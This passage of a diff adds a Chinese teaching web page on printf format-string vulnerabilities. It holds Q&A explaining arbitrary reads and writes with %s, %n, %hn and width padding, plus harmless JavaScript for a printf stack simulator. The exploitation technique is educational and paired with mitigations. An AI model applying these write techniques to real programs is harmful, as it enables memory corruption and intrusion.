+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p>每个 <code>%s</code> 都从栈上取 4 字节<strong>当地址</strong>去读内存；栈上大部分值不是合法可读地址 → 段错误。这就是最廉价的 DoS。注意：它也可能先读出一些垃圾数据才崩，不能用“还没崩”判断无害。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">03</span><span class="qt"><code>%n</code> 和 <code>%d</code> 最大的区别是什么？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p><code>%d</code> 是“读 + 打印”，<code>%n</code> 是“写”——它把已输出字符数写进参数所指地址，32 位下一次写 <strong>4 字节</strong>。它不产生任何屏幕输出，所以更隐蔽。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">04</span><span class="qt">想写一个字节 <code>0x41</code> 到某个地址，<code>%[n]c</code> 里的 n 是多少？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p><code>0x41 = 65</code>，地址本身占 4 个字符，n = 65 − 4 = <strong>61</strong>，即 <code>%61c</code>。如果程序还有前缀，要再减去前缀长度。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">05</span><span class="qt">为什么要把地址塞进格式串，而不是作为参数传？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p>因为漏洞现场是 <code>printf(user)</code>，攻击者<strong>只能控制格式串本身</strong>，传不了别的参数。而格式串（缓冲区）就在栈上，所以把地址写进格式串 = 把地址放到了栈上，再用 <code>%M$s</code> / <code>%M$n</code> 指过去。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">06</span><span class="qt">canary 那题里，为什么写 <code>foo[3]</code> 会影响 canary？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p>因为 <code>%n</code> 一次写 <strong>4 字节</strong>，而 <code>foo[3]</code> 后面紧跟着 canary。写 <code>0x00000080</code> 时，后 3 个零字节把 <code>canary[0..2]</code> 冲成了 0。它不是“只写一个字节”。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">07</span><span class="qt"><code>str_fmt_attack</code> 里 <code>%n</code> 写入的值为什么不是 4？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p>因为 payload 前面被 <code>snprintf</code> 自动拼上了 <code>"Invalid Password!!! "</code>（20 字符）。写入值 = <strong>20 + 4 + n</strong>。算 payload 时必须把这段前缀算进去。</p></div></div></div>
+          </div>
+          <div class="qa">
+            <button class="qa-q" aria-expanded="false"><span class="qi">08</span><span class="qt">除了改代码，还有哪些机制能挡住这类攻击？</span><span class="qm">+</span></button>
+            <div class="qa-a"><div class="qa-a-inner"><div class="qa-a-body"><p><code>printf("%s", user)</code>（根治）；编译器 <code>-Wformat-security -D_FORTIFY_SOURCE=2</code>；运行期 Canary / ASLR / DEP。它们都能被“先泄露再绕过”的思路对抗，所以要<strong>叠加使用</strong>，不能把缓解当成修复。</p></div></div></div>
+          </div>
+        </div>
+
+        <div class="callout fix" style="margin-top:26px">
+          <div class="co-head"><span class="ico">✓</span>三句话带走</div>
+          <p><strong>① 格式串是程序，用户输入是数据。</strong>把数据当程序，就有了漏洞。<br>
+          <strong>② 参数不够时 printf 顺着栈取：</strong><code>%x</code> 泄露、<code>%s</code> 任意读、<code>%n</code> 任意写。<br>
+          <strong>③ 写入值由已输出字符数控制。</strong>地址占 4 字节，宽度补差额；大数值拆成 <code>%hn</code> / <code>%hhn</code>；偏移 M 必须实测。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">END / 13</span>
+          <p><b>如果只能记住一件事：</b>不要让孩子（用户输入）拿方向盘（格式串）。技术上这叫“格式串必须是常量”，工程上这叫“数据与代码分离”。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================== SECTIONS ===================== -->
+
+    <!-- ===================== /SECTIONS ===================== -->
+
+    <footer class="footer">
+      <div>整理自《第2讲 软件安全 2-2》课件 · 32-bit x86 / Linux 教学环境<br><b>页面内所有地址与数值均为示例值，理解原理即可。</b></div>
+      <div>仅用于授权教学与实验环境<br><span class="sig">SECLAB / FMT-STRING · v2</span></div>
+    </footer>
+  </div>
+</main>
+
+<button class="to-top" id="toTop" aria-label="回到顶部">↑</button>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<noscript><div style="position:fixed;bottom:0;left:0;right:0;padding:12px;background:#ffc857;color:#111;text-align:center;font:13px sans-serif;z-index:200">本页的代码高亮与交互教具需要启用 JavaScript。</div></noscript>
+
+<script>
+(() => {
+'use strict';
+
+/* ============================================================
+   CORE — utilities, TOC, scroll, code blocks, reveal, canvas
+   ============================================================ */
+const $  = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
+const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+/* If any init below throws, never leave the lesson hidden. */
+setTimeout(() => {
+  $$('.reveal:not(.in)').forEach(el => el.classList.add('in'));
+}, 2800);
+
+const esc = s => String(s).replace(/[&<>"']/g, c => ({
+  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+}[c]));
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const debounce = (fn, ms) => {
+  let t = 0;
+  return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
+};
+const hex8 = n => '0x' + ((Number(n) >>> 0).toString(16).padStart(8, '0'));
+const hex2 = n => (Number(n) & 0xff).toString(16).padStart(2, '0');
+const leBytes = n => [n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff];
+const escBytes = n => leBytes(n).map(b => '\\x' + b.toString(16).padStart(2, '0')).join('');
+
+let toastTimer = 0;
+function toast(msg) {
+  const el = $('#toast');
+  if (!el) return;
+  el.textContent = msg;
+  el.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => el.classList.remove('show'), 1900);
+}
+
+async function copyText(text, okMsg = '已复制') {
+  try {
+    await navigator.clipboard.writeText(text);
+    toast(okMsg);
+  } catch (err) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.setAttribute('readonly', '');
+    ta.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0';
+    document.body.appendChild(ta);
+    ta.select();
+    let ok = false;
+    try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+    ta.remove();
+    toast(ok ? okMsg : '复制失败，请手动选中');
+  }
+}
+
+/* ---------- TOC + scroll spy + reading progress ---------- */
+const sections = $$('.section').map(el => {
+  const num = el.querySelector('.sec-num');
+  const h2 = el.querySelector('.sec-head h2') || el.querySelector('h2');
+  return {
+    id: el.id,
+    num: num ? num.textContent.trim() : '',
+    title: h2 ? h2.textContent.trim() : el.id
+  };
+}).filter(s => s.id);
+
+const cover = { id: 'top', num: '··', title: '封面与学习路线' };
+
+function buildToc(nav) {
+  if (!nav) return;
+  nav.innerHTML = '<div class="toc-label">COURSE / ' + sections.length + ' SECTIONS</div>' +
+    [cover, ...sections].map(s =>
+      '<a href="#' + s.id + '"><span class="n">' + esc(s.num) + '</span><span class="t">' + esc(s.title) + '</span></a>'
+    ).join('');
+}
+buildToc($('#sideToc'));
+buildToc($('#drawerToc'));
+
+let activeId = null;
+function setActive(id) {
+  if (id === activeId) return;
+  activeId = id;
+  $$('.toc a').forEach(a => {
+    const on = a.getAttribute('href') === '#' + id;
+    a.classList.toggle('on', on);
+    if (on) a.setAttribute('aria-current', 'true');
+    else a.removeAttribute('aria-current');
+  });
+  const s = id === 'top' ? cover : (sections.find(x => x.id === id) || cover);
+  const tc = $('#topCurrent');
+  if (tc) tc.textContent = id === 'top' ? 'OVERVIEW · 学习路线' : s.num + ' · ' + s.title;
+}
+
+const readbar = $('#readbar');
+const topPct = $('#topPct');
+const sideBar = $('#sideBar');
+const sidePct = $('#sidePct');
+const toTop = $('#toTop');
+let scrollQueued = false;
+
+function updateScroll() {
+  const y = window.scrollY || document.documentElement.scrollTop || 0;
+  const max = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
+  const pct = Math.min(1, Math.max(0, y / max));
+  if (readbar) readbar.style.width = (pct * 100).toFixed(2) + '%';
+  if (topPct) topPct.textContent = Math.round(pct * 100) + '%';
+  if (sideBar) sideBar.style.width = (pct * 100).toFixed(2) + '%';
+  if (sidePct) sidePct.textContent = String(Math.round(pct * 100)).padStart(2, '0') + '%';
+  if (toTop) toTop.classList.toggle('show', y > 760);
+
+  let cur = cover;
+  for (const s of sections) {
+    const el = document.getElementById(s.id);
+    if (!el) continue;
+    if (el.getBoundingClientRect().top <= 118) cur = s;
+    else break;
+  }
+  setActive(cur.id);
+}
+
+function queueScroll() {
+  if (scrollQueued) return;
+  scrollQueued = true;
+  requestAnimationFrame(() => { scrollQueued = false; updateScroll(); });
+}
+window.addEventListener('scroll', queueScroll, { passive: true });
+window.addEventListener('resize', queueScroll);
+
+/* ---------- mobile drawer ---------- */
+const menuBtn = $('#menuBtn');
+const drawer = $('#drawer');
+let drawerFocus = null;
+
+function openDrawer() {
+  if (!drawer) return;
+  drawerFocus = document.activeElement;
+  drawer.classList.add('open');
+  drawer.setAttribute('aria-hidden', 'false');
+  document.body.classList.add('no-scroll');
+  if (menuBtn) menuBtn.setAttribute('aria-expanded', 'true');
+  const close = drawer.querySelector('.drawer-close');
+  if (close) setTimeout(() => close.focus(), 40);
+}
+function closeDrawer() {
+  if (!drawer) return;
+  drawer.classList.remove('open');
+  drawer.setAttribute('aria-hidden', 'true');
+  document.body.classList.remove('no-scroll');
+  if (menuBtn) menuBtn.setAttribute('aria-expanded', 'false');
+  if (drawerFocus && drawerFocus.focus) drawerFocus.focus();
+}
+if (menuBtn) menuBtn.addEventListener('click', () => {
+  if (drawer && drawer.classList.contains('open')) closeDrawer();
+  else openDrawer();
+});
+if (drawer) {
+  drawer.addEventListener('click', e => {
+    if (e.target.closest('[data-close-drawer]') || e.target.closest('#drawerToc a')) closeDrawer();
+  });
+}
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape' && drawer && drawer.classList.contains('open')) closeDrawer();
+});
+if (toTop) toTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: reduceMotion ? 'auto' : 'smooth' }));
+
+/* ---------- syntax highlighting + code cards ---------- */
+const C_KEYWORDS = 'auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|inline|int|long|register|restrict|return|short|signed|sizeof|static|struct|switch|typedef|union|unsigned|void|volatile|while';
+const C_FUNCS = 'printf|fprintf|sprintf|snprintf|vprintf|vfprintf|vsprintf|vsnprintf|memset|strcpy|strncpy|fgets|malloc|free|getchar|putchar|va_start|va_arg|va_end|syslog|warn|err|main';
+
+function highlightC(src) {
+  const re = new RegExp(
+    '(\\/\\*[\\s\\S]*?\\*\\/|\\/\\/[^\\n]*)' +          // 1 comments
+    '|("(?:\\\\.|[^"\\\\])*"|\'(?:\\\\.|[^\'\\\\])*\')' + // 2 strings
+    '|(^[ \\t]*#[^\\n]*)' +                            // 3 preprocessor
+    '|\\b(' + C_KEYWORDS + ')\\b' +                    // 4 keywords
+    '|\\b(' + C_FUNCS + ')\\b' +                       // 5 functions
+    '|\\b(0x[0-9a-fA-F]+|\\d+)\\b',                    // 6 numbers
+    'gm'
+  );
+  let out = '', last = 0, m;
+  re.lastIndex = 0;
+  while ((m = re.exec(src))) {
+    out += esc(src.slice(last, m.index));
+    const cls = m[1] ? 'tk-c' : m[2] ? 'tk-s' : m[3] ? 'tk-p'
+      : m[4] ? 'tk-k' : m[5] ? 'tk-r' : 'tk-n';
+    out += '<span class="' + cls + '">' + esc(m[0]) + '</span>';
+    last = re.lastIndex;
+    if (m[0] === '') re.lastIndex++;
+  }
+  out += esc(src.slice(last));
+  return out;
+}
+
+function highlightAsm(src) {
+  return src.split('\n').map(line => {
+    const semi = line.indexOf(';');
+    let code = semi >= 0 ? line.slice(0, semi) : line;
+    const comment = semi >= 0 ? line.slice(semi) : '';
+    let out = esc(code)
+      .replace(/("(?:\\.|[^"\\])*")/g, '<span class="tk-s">$1</span>')
+      .replace(/\b(eax|ebx|ecx|edx|esi|edi|esp|ebp|eip)\b/g, '<span class="tk-r">$1</span>')
+      .replace(/\b(xor|push|pop|mov|lea|call|ret|add|sub|inc|dec|cmp|jmp|je|jne|int|cdq|nop)\b/g, '<span class="tk-k">$1</span>')
+      .replace(/\b(0x[0-9a-fA-F]+|\d+)\b/g, '<span class="tk-n">$1</span>');
+    if (comment) out += '<span class="tk-c">' + esc(comment) + '</span>';
+    return out;
+  }).join('\n');
+}
+
+const LANG_LABEL = { c: 'C', asm: 'X86 ASM', bash: 'BASH' };
+
+function convertCodeBlock(script) {
+  const raw = script.textContent.replace(/\r\n?/g, '\n').replace(/^\n+/, '').replace(/\s+$/, '');
+  const lang = (script.dataset.lang || 'c').toLowerCase();
+  const file = script.dataset.file || 'snippet';
+  const numbered = script.dataset.lines != null;
+  const highlighted = lang === 'asm' ? highlightAsm(raw) : highlightC(raw);
+  const lines = highlighted.split('\n');
+
+  const card = document.createElement('div');
+  card.className = 'code';
+  if (numbered) card.setAttribute('data-lines', '1');
+  card.innerHTML =
+    '<div class="win-bar">' +
+      '<span class="win-dots"><i></i><i></i><i></i></span>' +
+      '<span class="win-file">' + esc(file) + '</span>' +
+      '<span class="win-lang">' + esc(LANG_LABEL[lang] || lang.toUpperCase()) + '</span>' +
+      '<button class="copy-btn" type="button" aria-label="复制代码">COPY</button>' +
+    '</div>' +
+    '<pre><code>' + lines.map(line => {
+      const bad = /漏洞点|致命|☠/.test(line);
+      return '<span class="cl' + (bad ? ' mark bad' : '') + '">' + (line || ' ') + '</span>';
+    }).join('') + '</code></pre>';
+
+  const btn = card.querySelector('.copy-btn');
+  if (btn) btn.addEventListener('click', () => copyText(raw, '代码已复制'));
+  script.replaceWith(card);
+}
+
+$$('script.code-src').forEach(convertCodeBlock);
+
+/* ---------- reveal ---------- */
+try {
+  if ('IntersectionObserver' in window) {
+    const io = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.classList.add('in');
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.08, rootMargin: '0px 0px -6% 0px' });
+    $$('.reveal').forEach(el => io.observe(el));
+  } else {
+    $$('.reveal').forEach(el => el.classList.add('in'));
+  }
+} catch (e) {
+  $$('.reveal').forEach(el => el.classList.add('in'));
+}
+
+/* ---------- hero hex rain ---------- */
+function initHexRain() {
+  const canvas = $('#hexRain');
+  if (!canvas) return;
+  const ctx = canvas.getContext && canvas.getContext('2d');
+  if (!ctx) return;
+
+  let w = 1, h = 1, dpr = 1;
+  let drops = [];
+  let raf = 0, last = 0, visible = true;
+  const glyphs = '0123456789abcdef%$nxdsh';
+  const COL_W = 28;
+
+  function makeDrop(i) {
+    return {
+      x: i * COL_W + 8,
+      y: Math.random() * h,
+      speed: 16 + Math.random() * 30,
+      chars: Array.from({ length: 8 }, () => glyphs[Math.floor(Math.random() * glyphs.length)])
+    };
+  }
+
+  function size() {
+    const r = canvas.getBoundingClientRect();
+    dpr = Math.min(window.devicePixelRatio || 1, 2);
+    w = Math.max(1, r.width);
+    h = Math.max(1, r.height);
+    canvas.width = Math.round(w * dpr);
+    canvas.height = Math.round(h * dpr);
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    const cols = Math.max(10, Math.floor(w / COL_W));
+    drops = Array.from({ length: cols }, (_, i) => makeDrop(i));
+    if (reduceMotion) draw(0, true);
+  }
+
+  function draw(ts, once) {
+    if (!once && ts - last < 75) { raf = requestAnimationFrame(draw); return; }
+    last = ts;
+    ctx.clearRect(0, 0, w, h);
+    ctx.font = '11px ui-monospace, Consolas, monospace';
+    ctx.textAlign = 'left';
+    for (const d of drops) {
+      for (let k = 0; k < d.chars.length; k++) {
+        const y = d.y - k * 14;
+        if (y < -20 || y > h + 20) continue;
+        ctx.globalAlpha = 0.06 + 0.16 * (1 - k / d.chars.length);
+        ctx.fillStyle = k === 0 ? '#c8f94c' : (k % 4 === 0 ? '#66e0ea' : '#9bb0c0');
+        ctx.fillText(d.chars[k], d.x, y);
+      }
+      d.y += d.speed;
+      if (d.y > h + 140) {
+        d.y = -Math.random() * 220;
+        d.speed = 16 + Math.random() * 30;
+        d.chars = Array.from({ length: 8 }, () => glyphs[Math.floor(Math.random() * glyphs.length)]);
+      }
+    }
+    ctx.globalAlpha = 1;
+    if (!once) raf = requestAnimationFrame(draw);
+  }
+
+  size();
+  if (reduceMotion) return;
+
+  const hero = $('.hero');
+  if ('IntersectionObserver' in window && hero) {
+    new IntersectionObserver(entries => {
+      visible = entries[0].isIntersecting;
+      if (visible && !raf) raf = requestAnimationFrame(draw);
+      if (!visible && raf) { cancelAnimationFrame(raf); raf = 0; }
+    }, { threshold: 0 }).observe(hero);
+  }
+  raf = requestAnimationFrame(draw);
+  window.addEventListener('resize', debounce(size, 220));
+}
+
+try { initHexRain(); } catch (e) { /* decorative only */ }
+
+/* first paint */
+setTimeout(updateScroll, 60);
+setTimeout(updateScroll, 350);
+window.addEventListener('load', queueScroll);
+
+/* ============================================================
+   LAB 01 — push order (cdecl, right to left)
+   ============================================================ */
+(() => {
+  const stack = $('#pushStack');
+  if (!stack) return;
+  const stepEl = $('#pushStep');
+  const noteEl = $('#pushNote');
+  const nextBtn = $('#pushNext');
+  const allBtn = $('#pushAll');
+  const resetBtn = $('#pushReset');
+
+  const rows = [
+    { addr: '0xbfffebe4', val: '0xbfffebf4', label: '第 3 个参数 &a（a 的地址）' },
+    { addr: '0xbfffebe0', val: '0x0000000a', label: '第 2 个参数 a（值 10）' },
+    { addr: '0xbfffebdc', val: '0x00000005', label: '第 1 个参数 i（值 5）' },
+    { addr: '0xbfffebd8', val: '0x08048568', label: '格式串地址 fmt' },
+    { addr: '0xbfffebd4', val: '0x080484a1', label: '返回地址 RET（call 自动压入）' }
+  ];
+
+  const caps = [
+    '<b>准备</b> <span class="dim">main 正在求值 printf 的参数。esp 初始 = 0xbfffebe8。</span>',
+    '<b>① push &a</b> <span class="dim">0xbfffebf4</span> → esp 减 4，值落在 0xbfffebe4。',
+    '<b>② push a</b> <span class="dim">0x0000000a</span> → esp 减到 0xbfffebe0。',
+    '<b>③ push i</b> <span class="dim">0x00000005</span> → esp 减到 0xbfffebdc。',
+    '<b>④ push fmt</b> <span class="dim">0x08048568</span> → esp 减到 0xbfffebd8。',
+    '<b>⑤ call printf</b> <span class="dim">0x080484a1</span> → RET 入栈，esp = 0xbfffebd4。'
+  ];
+
+  const notes = [
+    '栈从高地址向低地址生长；esp 始终指向当前栈顶。先压入的参数地址更高。',
+    '&a 是“最右边的参数”，所以第一个压栈。它落在参数区最高的位置。',
+    '第二个压入的是 a；它排在 &a 的下方（地址更低 4 字节）。',
+    '第三个压入 i。注意：i 是参数 #1，离格式串最近。',
+    '最后压格式串地址。此时 esp 指向 fmt，但 printf 尚未开始执行。',
+    '压栈完成。printf 的 va_list 从 fmt 后一格 0xbfffebdc（参数 #1）开始，向高地址依次取数。'
+  ];
+
+  const espAt = ['0xbfffebe8', '0xbfffebe4', '0xbfffebe0', '0xbfffebdc', '0xbfffebd8', '0xbfffebd4'];
+  let step = 0;
+
+  function render() {
+    let html = '<div class="stack-cap"><span>STACK VIEW · HIGH → LOW</span><span>ESP = ' + espAt[step] + '</span></div>';
+    html += '<div class="stack-row ctx"><span class="ap"></span><span class="addr">0xbfffebe8</span><span class="val">↑ 初始栈顶</span><span class="lbl">下一次 push 会落到 0xbfffebe4</span></div>';
+    rows.forEach((r, i) => {
+      const shown = i < step;
+      const hot = i === step - 1;
+      const cls = ['stack-row', shown ? '' : 'pending', hot ? 'hot' : '', hot ? 'enter' : ''].join(' ').trim();
+      html += '<div class="' + cls + '">' +
+        '<span class="ap">' + (hot ? 'esp →' : '') + '</span>' +
+        '<span class="addr">' + r.addr + '</span>' +
+        '<span class="val">' + (shown ? r.val : '····') + '</span>' +
+        '<span class="lbl">' + (shown ? r.label : '待压入') + '</span>' +
+      '</div>';
+    });
+    html += '<div class="stack-row ctx"><span class="ap"></span><span class="addr">更低地址</span><span class="val">… printf 自己的栈帧 …</span><span class="lbl">esp 向这个方向生长</span></div>';
+    stack.innerHTML = html;
+
+    if (stepEl) stepEl.innerHTML = caps[step];
+    if (noteEl) noteEl.textContent = notes[step];
+    if (nextBtn) {
+      nextBtn.disabled = step >= 5;
+      nextBtn.textContent = step >= 5 ? '已完成 ✓' : '压入下一个 →';
+    }
+    if (allBtn) allBtn.disabled = step >= 5;
+    if (resetBtn) resetBtn.disabled = step === 0;
+  }
+
+  if (nextBtn) nextBtn.addEventListener('click', () => { if (step < 5) { step++; render(); } });
+  if (allBtn) allBtn.addEventListener('click', () => { step = 5; render(); });
+  if (resetBtn) resetBtn.addEventListener('click', () => { step = 0; render(); });
+  render();
+})();
+/* ============================================================
+   LAB 02 — printf stack simulator
+   ============================================================ */
+(() => {
+  const root = $('#sim');
+  if (!root) return;
+
+  const els = {
+    fmt: $('#simFmt'), args: $('#simArgs'), stack: $('#simStack'), scan: $('#simScan'),
+    token: $('#simTokenInfo'), ap: $('#simAp'), count: $('#simCount'), out: $('#simOut'),
+    note: $('#simNote'), step: $('#simStepBtn'), auto: $('#simAutoBtn'), reset: $('#simResetBtn')
+  };
+
+  const SLOT_COUNT = 12;
+  const SLOT_BASE = 0xbfffebdc;
+  const FMT_ADDR = 0xbfffebd8;
+  const RET_ADDR = 0xbfffebd4;
+  const DISPLAY_CAP = 240;
+
+  const RESIDUAL = [
+    { v: 0xbfffebf4, l: '残留：指向 a 的指针' },
+    { v: 0x0000000a, l: '残留：局部变量 a（值 10）' },
+    { v: 0x00000005, l: '残留：局部变量 i（值 5）' },
+    { v: 0x08048568, l: '残留：代码段地址' },
+    { v: 0x41414141, l: '残留：缓冲区 "AAAA"' },
+    { v: 0x00000064, l: '残留：字符 d（0x64）' },
+    { v: 0x00000000, l: '残留：空指针' },
+    { v: 0x080484a1, l: '残留：返回地址' },
+    { v: 0xbffffe10, l: '残留：栈指针' },
+    { v: 0x0000002f, l: '残留：字符 /（0x2f）' },
+    { v: 0x00000000, l: '未建模区域' }
+  ];
+
+  const READABLE = new Map([
+    [0xbfffebf4, 'Inva'],
+    [0x08048568, 'Invalid Password!!! '],
+    [0xbfffec88, '111122223333'],
+    [0xbffffe10, '/bin/sh'],
+    [0x0804a010, '111122223333']
+  ]);
+
+  let state = null;
+  let autoTimer = 0;
+  let autoRunning = false;
+
+  function parseFormat(fmt) {
+    const re = /%(?:(\d+)\$)?([-+ #0]*)(\d+)?(?:\.(\d+))?(hh|h|ll|l|j|z|t|L)?([diouxXeEfFgGaAcspn%])/g;
+    const tokens = [];
+    let last = 0, m;
+    re.lastIndex = 0;
+    while ((m = re.exec(fmt))) {
+      if (m.index > last) tokens.push({ type: 'lit', text: fmt.slice(last, m.index) });
+      tokens.push({
+        type: 'conv',
+        conv: m[6],
+        pos: m[1] ? parseInt(m[1], 10) : 0,
+        flags: m[2] || '',
+        width: m[3] ? parseInt(m[3], 10) : 0,
+        precision: m[4] != null ? parseInt(m[4], 10) : null,
+        mod: m[5] || '',
+        text: m[0]
+      });
+      last = re.lastIndex;
+      if (m[0] === '') re.lastIndex++;
+    }
+    if (last < fmt.length) tokens.push({ type: 'lit', text: fmt.slice(last) });
+    return tokens;
+  }
+
+  function parseArgs(raw) {
+    return raw.split(',').map(s => s.trim()).filter(Boolean).map(s => {
+      let v = 0;
+      if (/^0x[0-9a-f]+$/i.test(s)) v = parseInt(s, 16);
+      else if (/^-?\d+$/.test(s)) v = parseInt(s, 10);
+      else if (/^'.'$/.test(s)) v = s.charCodeAt(1);
+      return v >>> 0;
+    });
+  }
+
+  function buildSlots(args) {
+    return Array.from({ length: SLOT_COUNT }, (_, i) => {
+      const k = i + 1;
+      const addr = (SLOT_BASE + i * 4) >>> 0;
+      if (k <= args.length) {
+        return { addr, v: args[k - 1] >>> 0, label: '传入参数 #' + k, stale: false };
+      }
+      const r = RESIDUAL[k - args.length - 1] || { v: 0, l: '未建模区域' };
+      return { addr, v: r.v >>> 0, label: r.l, stale: true };
+    });
+  }
+
+  function slotAt(idx) {
+    if (idx >= 1 && idx <= SLOT_COUNT) return state.slots[idx - 1];
+    return { addr: (SLOT_BASE + (idx - 1) * 4) >>> 0, v: 0, label: '栈外（未建模）', stale: true };
+  }
+
+  function addOut(text, cls) {
+    if (text) state.out.push({ text, cls: cls || '' });
+  }
+
+  function padded(text, width, flags, zeroOK) {
+    const total = Math.max(width, text.length);
+    const visible = Math.min(total, DISPLAY_CAP);
+    let s = text.slice(0, Math.min(text.length, DISPLAY_CAP));
+    if (visible > s.length) {
+      const pad = visible - s.length;
+      if (flags.indexOf('-') >= 0) s = s + ' '.repeat(pad);
+      else if (zeroOK && flags.indexOf('0') >= 0) s = '0'.repeat(pad) + s;
+      else s = ' '.repeat(pad) + s;
+    }
+    return { text: s, total, truncated: total > DISPLAY_CAP };
+  }
+
+  function mark(idx, status) {
+    if (idx >= 1 && idx <= SLOT_COUNT) state.status[idx] = status;
+  }
+
+  function crash(msg, idx) {
+    state.crashed = true;
+    state.crashSlot = idx || 0;
+    state.note = msg;
+    addOut('\nSegmentation fault (core dumped)\n', 'bad');
+  }
+
+  function runConv(tok) {
+    const idx = tok.pos ? tok.pos : state.cursor++;
+    const slot = slotAt(idx);
+    const value = slot.v >>> 0;
+    state.activeSlot = idx;
+    const p = tok.precision;
+
+    if (tok.conv === 's') {
+      const str = READABLE.get(value);
+      if (str === undefined) {
+        mark(idx, 'crash');
+        crash('第 ' + idx + ' 格的 ' + hex8(value) + ' 不是可读地址。printf 按 %s 去解引用它 → SIGSEGV。', idx);
+        return;
+      }
+      let text = str;
+      if (p != null) text = text.slice(0, p);
+      const r = padded(text, tok.width, tok.flags, false);
+      addOut(r.text);
+      state.count += r.total;
+      if (r.truncated) addOut('〔模拟显示截断〕', 'dim');
+      mark(idx, slot.stale ? 'leaked' : 'read');
+      state.note = '%s 把第 ' + idx + ' 格的 ' + hex8(value) + ' 当地址，读出 "' + text + '"' +
+        (slot.stale ? '。注意：这一格已经越过你实际传入的参数区。' : '。');
+      return;
+    }
+
+    if (tok.conv === 'n') {
+      const size = tok.mod === 'hh' ? 1 : tok.mod === 'h' ? 2 : 4;
+      if (!(value >= 0xbfffeb00 && value < 0xbfffed00)) {
+        mark(idx, 'crash');
+        crash('第 ' + idx + ' 格的 ' + hex8(value) + ' 不可写。%n 会往这个地址写入计数 → SIGSEGV。', idx);
+        return;
+      }
+      let written = state.count;
+      if (size === 1) written = written & 0xff;
+      else if (size === 2) written = written & 0xffff;
+      mark(idx, 'wrote');
+      const hit = state.slots.find(s => s.addr === value);
+      if (hit) {
+        let nv = hit.v >>> 0;
+        if (size === 1) nv = ((nv & 0xffffff00) | (written & 0xff)) >>> 0;
+        else if (size === 2) nv = ((nv & 0xffff0000) | (written & 0xffff)) >>> 0;
+        else nv = written >>> 0;
+        hit.v = nv;
+        hit.label = '被 %' + (size === 1 ? 'hhn' : size === 2 ? 'hn' : 'n') + ' 改写';
+        const hitIdx = state.slots.indexOf(hit) + 1;
+        mark(hitIdx, 'wrote');
+      }
+      addOut('〔%n 不产生屏幕输出；已向 ' + hex8(value) + ' 写入 ' + written + '〕\n', 'dim');
+      state.note = '%n 不打印任何字符。它把当前已输出计数 ' + state.count + '（0x' +
+        (written >>> 0).toString(16) + '）写入 ' + hex8(value) +
+        (size < 4 ? '，只写低 ' + size + ' 字节：该格其余字节保持不变' : '，一次写满 4 字节') + '。';
+      return;
+    }
+
+    let text = '';
+    if (tok.conv === 'd' || tok.conv === 'i') text = String(value | 0);
+    else if (tok.conv === 'u') text = String(value >>> 0);
+    else if (tok.conv === 'x') text = (value >>> 0).toString(16);
+    else if (tok.conv === 'X') text = (value >>> 0).toString(16).toUpperCase();
+    else if (tok.conv === 'o') text = (value >>> 0).toString(8);
+    else if (tok.conv === 'p') text = '0x' + (value >>> 0).toString(16).padStart(8, '0');
+    else if (tok.conv === 'c') text = String.fromCharCode(value & 0xff);
+    else text = String(value | 0);
+
+    const r = padded(text, tok.width, tok.flags, true);
+    addOut(r.text);
+    state.count += r.total;
+    if (r.truncated) addOut('〔模拟显示截断〕', 'dim');
+    mark(idx, slot.stale ? 'leaked' : 'read');
+    state.note = '%' + tok.conv + ' 从第 ' + idx + ' 格取走 ' + hex8(value) +
+      (slot.stale ? '（残留数据，不是你传入的参数）' : '（你传入的参数）') +
+      '，按 ' + tok.conv + ' 解释后输出 ' + JSON.stringify(text) + '。';
+  }
+
+  function executeOne() {
+    if (!state || state.done || state.crashed) return;
+    if (!state.tokens.length) { state.done = true; render(); return; }
+
+    let didConv = false;
+    while (state.index < state.tokens.length) {
+      const tok = state.tokens[state.index];
+      state.current = state.index;
+      state.index++;
+      if (tok.type === 'lit') {
+        addOut(tok.text);
+        state.count += tok.text.length;
+        continue;
+      }
+      if (tok.conv === '%') {
+        addOut('%');
+        state.count += 1;
+        continue;
+      }
+      runConv(tok);
+      didConv = true;
+      break;
+    }
+
+    if (state.crashed) {
+      state.current = state.crashAt != null ? state.crashAt : state.current;
+    } else if (state.index >= state.tokens.length) {
+      state.done = true;
+      state.current = state.tokens.length;
+      if (!state.note) state.note = '扫描结束。';
